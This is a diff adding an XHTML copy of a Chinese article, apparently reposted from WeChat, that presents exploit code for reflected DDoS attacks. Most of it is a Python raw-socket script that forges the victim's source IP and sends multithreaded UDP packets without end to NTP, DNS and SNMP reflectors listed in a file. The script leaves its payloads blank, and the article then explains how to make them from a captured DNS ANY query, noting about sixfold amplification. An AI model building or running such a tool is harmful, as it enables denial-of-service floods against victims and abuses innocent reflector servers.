@@ -1,0 +1,108 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>浅谈拒绝服务攻击的原理与防御（3）：反射DDOS攻击利用代码</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>浅谈拒绝服务攻击的原理与防御（3）：反射DDOS攻击利用代码</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzIyMzE5NTQ3Ng==&amp;mid=2650584672&amp;idx=5&amp;sn=7f2182b8a729afbd55c13a1a1dfc7cc1&amp;chksm=f029ee5bc75e674df4a42ae0c341b382dc27f2c31e93b908ccb31b127bc247b0ce719d21bb0e&amp;scene=126&amp;sessionid=1681370548#rd">http://mp.weixin.qq.com/s?__biz=MzIyMzE5NTQ3Ng==&amp;mid=2650584672&amp;idx=5&amp;sn=7f2182b8a729afbd55c13a1a1dfc7cc1&amp;chksm=f029ee5bc75e674df4a42ae0c341b382dc27f2c31e93b908ccb31b127bc247b0ce719d21bb0e&amp;scene=126&amp;sessionid=1681370548#rd</a></blockquote><p><span style="line-height: 1.6;"/></p><p><img data-type="gif" data-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRyskxXGvZQgOFTCFaUiaU6PSmdmwSdb3JEAuZwPx0lPWsHf2xuib8Asew/0?wx_fmt=gif" data-ratio="0.15625" data-w="640" src="../Images/bd12d37e5b6d2b5b81389d88a9cef40a.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRyskxXGvZQgOFTCFaUiaU6PSmdmwSdb3JEAuZwPx0lPWsHf2xuib8Asew/0?wx_fmt=gif"/></p><p><span style="line-height: 1.6;"/><br/></p><p><span style="line-height: 1.6;">首</span><span style="line-height: 1.6;">先，我这是在linux环境下写的，开始我用windows开发的，但是总是不成功，调用python的原始套接字伪造源IP地址总是不能发出去，后来我换到linux上就好了（kali），我并没有调用第三方的库，只要是linux+python就可以执行，在执行之前需要</span><span style="line-height: 1.6;">先在利用代码的同文件夹中建一个ipaddress.txt文件</span><span style="line-height: 1.6;"> ，作为反射攻击的反射资源地址池，多点少点都行，但是记住最后一行不要空着，不然程序报错，格式就如同下图（IP地址，端口号）：</span><br/></p><p><br/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMGYsxq3t86GQxNiaZM07aStUUGdTr0nc2zq1C1PGus9aBvyLdI1gu5Iw/0?wx_fmt=jpeg" data-ratio="0.6242603550295858" data-w="676" src="../Images/c71c88a73d90974a86bf239eb5375bf7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMGYsxq3t86GQxNiaZM07aStUUGdTr0nc2zq1C1PGus9aBvyLdI1gu5Iw/0?wx_fmt=jpeg"/></p><p><br/></p><p><span style="font-size: 18px;"><strong>利用代码就是如下这些了。。。。</strong></span></p><p><br/></p><pre style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 9.5px; margin-top: 0px; margin-bottom: 15px; line-height: 1.42857; color: rgb(51, 51, 51); word-break: break-all; word-wrap: break-word; border: 1px solid rgb(228, 228, 228); border-radius: 4px; background-color: rgb(243, 243, 243);"><code class="hljs python" style="box-sizing: border-box; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: inherit; padding: 0.5em; color: rgb(68, 68, 68); border-radius: 0px; white-space: pre-wrap; display: block; overflow-x: auto; background-image: initial; background-attachment: initial; background-size: initial; background-origin: initial; background-clip: initial; background-position: initial; background-repeat: initial;"><span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#!/usr/bin/python</span><span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#-*-coding:utf-8-*-</span><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">import</span> socket<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">import</span> struct<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">import</span> random<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">import</span> threading<span class="hljs-class" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">class</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">myThread</span> <span class="hljs-params" style="box-sizing: border-box;">(threading.Thread)</span>:</span>   
+    <span class="hljs-function" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">def</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">__init__</span><span class="hljs-params" style="box-sizing: border-box;">(self,srcip,srcport)</span>:</span>        threading.Thread.__init__(self)	 
+        self.srcip = srcip
+        self.srcport =srcport
+		 
+    <span class="hljs-function" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">def</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">run</span><span class="hljs-params" style="box-sizing: border-box;">(self)</span>:</span>                    
+        re_att(self.srcip,self.srcport)<span class="hljs-function" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">def</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">checksum</span><span class="hljs-params" style="box-sizing: border-box;">(data)</span>:</span>    s = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>    n = len(data) % <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">2</span>    <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">for</span> i <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">in</span> range(<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>, len(data)-n, <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">2</span>):
+        s+= ord(data[i]) + (ord(data[i+<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">1</span>]) &lt;&lt; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">8</span>)
+    <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">if</span> n:
+        s+= ord(data[i+<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">1</span>])
+    <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">while</span> (s &gt;&gt; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">16</span>):
+        s = (s &amp; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0xFFFF</span>) + (s &gt;&gt; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">16</span>)
+    s = ~s &amp; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0xffff</span>    <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">return</span> s<span class="hljs-function" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">def</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">IP</span><span class="hljs-params" style="box-sizing: border-box;">(source,destination,udplen)</span>:</span>
+	version = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">4</span>
+	ihl = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">5</span>
+	tos = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>
+	tl = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">20</span>+udplen
+	ip_id = random.randint(<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">1</span>,<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">65530</span>)
+	flags = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span> 
+	offset = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>
+	ttl = <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">128</span>
+	protocol =<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">17</span>
+	check =<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>
+	source = socket.inet_aton(source)
+	destination = socket.inet_aton(destination)
+
+	ver_ihl = (version &lt;&lt; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">4</span>)+ihl
+	flags_offset = (flags &lt;&lt; <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">13</span>)+offset
+	ip_header = struct.pack(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">"!BBHHHBBH4s4s"</span>,
+                    ver_ihl,
+                    tos,
+                    tl,
+                    ip_id,
+                    flags_offset,
+                    ttl,
+                    protocol,
+                    check,
+                    source,
+                    destination)
+	check=checksum(ip_header)
+	ip_header = struct.pack(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">"!BBHHHBBH4s4s"</span>,
+                    ver_ihl,
+                    tos,
+                    tl,
+                    ip_id,
+                    flags_offset,
+                    ttl,
+                    protocol,
+                    socket.htons(check),
+                    source,
+                    destination)  	<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">return</span> ip_header<span class="hljs-function" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">def</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">udp</span><span class="hljs-params" style="box-sizing: border-box;">(sp,dp,datalen)</span>:</span>
+	srcport=sp
+	dstport=dp
+	udplen=<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">8</span>+datalen
+	udp_checksum=<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>
+	udp_header = struct.pack(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">"!HHHH"</span>,srcport,dstport,udplen,udp_checksum)	<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">return</span> udp_header<span class="hljs-function" style="box-sizing: border-box;"><span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">def</span> <span class="hljs-title" style="box-sizing: border-box; color: rgb(136, 0, 0); font-weight: bold;">re_att</span><span class="hljs-params" style="box-sizing: border-box;">(srcip,srcport)</span>:</span>
+	NTP_data=<span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#payload需要你们自己写啊，就是写\x0a 这种十六进制的就可以，不会写的话叫你们个简单方法，去whireshark上抓一个包</span>
+	DNS_data=<span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#payload需要你们自己写啊</span>
+	SNMP_data=<span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#payload需要你们自己写啊</span>
+
+	n=len(ipaddr)<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">-1</span>
+	<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">while</span> <span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">1</span>:
+		i=random.randint(<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>,n)
+		ip_port=ipaddr[i]
+		dstip=ip_port[<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">0</span>]
+		dstport=int(ip_port[<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">1</span>])		<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">if</span> dstport==<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">123</span>:
+			data=NTP_data		<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">elif</span> dstport==<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">53</span>:
+			data=DNS_data		<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">elif</span> dstport==<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">161</span>:
+			data=SNMP_data		<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">else</span>:			<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">print</span> <span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">'dest port error!'</span>
+		datalen=len(data)
+		udp_header=udp(srcport,dstport,datalen)
+		ip_header=IP(srcip,dstip,len(udp_header)+datalen)
+		ip_packet=ip_header+udp_header+data
+		s.sendto(ip_packet,(dstip,dstport))
+
+proto_udp=<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">17</span>proto_tcp=<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">6</span>s = socket.socket(socket.AF_INET,socket.SOCK_RAW,<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">17</span>)
+s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,<span class="hljs-number" style="box-sizing: border-box; color: rgb(136, 0, 0);">1</span>)
+ipaddr=[]
+f = open(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">"ipaddress.txt"</span>,<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">"r"</span>)
+lines=f.readlines()<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">for</span> line <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">in</span> lines:
+	line=line.strip(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">'\r\n'</span>)
+	l=line.split(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">','</span>)
+	ipaddr.append(l)
+
+srcip=raw_input(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">'attack IP:'</span>)
+srcport=int(input(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">'attack PORT:'</span>))
+threads=int(input(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">"线程数threads："</span>))
+
+threads_name=[]
+need=(srcip,srcport)	
+<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">for</span> i <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">in</span> range(threads):
+	threads_name.append(<span class="hljs-string" style="box-sizing: border-box; color: rgb(136, 0, 0);">'teread'</span>+str(i))<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">for</span> i <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">in</span> range(threads):	
+	threads_name[i]=myThread(srcip,srcport)<span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">for</span> i <span class="hljs-keyword" style="box-sizing: border-box; font-weight: bold;">in</span> range(threads):
+	threads_name[i].start()<span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#这个攻击没有结束，想停就直接关了终端就可以了</span><span class="hljs-comment" style="box-sizing: border-box; color: rgb(136, 136, 136);">#这个脚本支持多线程，但是要量力而行，我在虚拟机中10线程就有点卡了</span><br style="box-sizing: border-box;"/></code></pre><p style="box-sizing: border-box; margin-bottom: 10px; font-size: 15px; line-height: 26px; word-wrap: break-word; word-break: break-all; white-space: pre-wrap; color: rgb(88, 88, 88); font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; background-color: rgb(255, 255, 255);"><br/></p><p>这个工具没带payload，但是我可以教大家一个简单的写payload的方法，就是用whireshark抓包</p><p><br/></p><p>第一步，打开kali whireshark抓包，然后开终端，用dig工具</p><p><br/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMwpiazpibpjZt7mic0fGxs7nnOzsbcVKcxw3j4UrDbOmMmHPb9B4Cy5sOQ/0?wx_fmt=jpeg" data-ratio="0.6681159420289855" data-w="690" style="width: 100%; height: auto;" src="../Images/019c714ebbc0ad6ad72020e21d0c2496.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMwpiazpibpjZt7mic0fGxs7nnOzsbcVKcxw3j4UrDbOmMmHPb9B4Cy5sOQ/0?wx_fmt=jpeg"/></p><p><br/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMxM2icPFPfSz3QXhM4Q6zo5hvqa3tOJQrIibmiaRo7qvXBahWOVErYNmZA/0?wx_fmt=jpeg" data-ratio="0.5623188405797102" data-w="690" style="width: 100%; height: auto;" src="../Images/044f73dc7bea409eae5d5ef8101a6aab.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMxM2icPFPfSz3QXhM4Q6zo5hvqa3tOJQrIibmiaRo7qvXBahWOVErYNmZA/0?wx_fmt=jpeg"/></p><p><br/></p><p>看，这就能抓到一个DNS的请求和回复包了。这里用的是ANY，请求80字节回复486字节，放大了6倍</p><p><br/></p><p><br/></p><p>第二步，点开请求包（就是80字节那个，别点开错了），选中DNS部分，然后复制，为hex转储</p><p><br/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMDicEYEvOXdQUmh4MjsnnrICkD2VHCMN9YvQkx37UsVExmbAQqAbPyNA/0?wx_fmt=jpeg" data-ratio="0.5608695652173913" data-w="690" style="width: 100%; height: auto;" src="../Images/f8df3401fc01152f1118adcb3721ee01.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMDicEYEvOXdQUmh4MjsnnrICkD2VHCMN9YvQkx37UsVExmbAQqAbPyNA/0?wx_fmt=jpeg"/></p><p><br/></p><p>第三步，打开个记事本，把刚才的粘贴进去，这不就是十六进制的payload了吗，把前面的0000那些删掉，再把这些字符以‘\xdf’+’\xdb’+…..这种形式连起来就可以了</p><p><br/></p><p><img data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMsmjicDV1EyGLicKIsIqr2mZ2YRibibRA012phvriazQNLw7quEIiaXt0btRA/0?wx_fmt=jpeg" data-ratio="0.4057971014492754" data-w="690" style="width: 100%; height: auto;" src="../Images/4473159981e4428e2d0d27c2a6d86f4b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/5ZACCn1bWEzRUmklNtgrJPibDarlrt0oMsmjicDV1EyGLicKIsIqr2mZ2YRibibRA012phvriazQNLw7quEIiaXt0btRA/0?wx_fmt=jpeg"/></p><p><br/></p><p><br/></p><p><br/></p><p><img data-type="gif" data-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRL7zA6G4OWxgibRsJT9lLafJppjibev1TUxHYEia92BiaAtlc7u0BcOmUvA/0?wx_fmt=gif" data-ratio="0.7" data-w="500" style="width: 100%; height: auto;" src="../Images/e8c1330a4ae95198ebdb17e4f3bb4cbb.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_gif/5ZACCn1bWEwrm1niax0xWl6tFwyaPqCHRL7zA6G4OWxgibRsJT9lLafJppjibev1TUxHYEia92BiaAtlc7u0BcOmUvA/0?wx_fmt=gif"/></p><p><br/></p>
+        
+</body>
+</html>
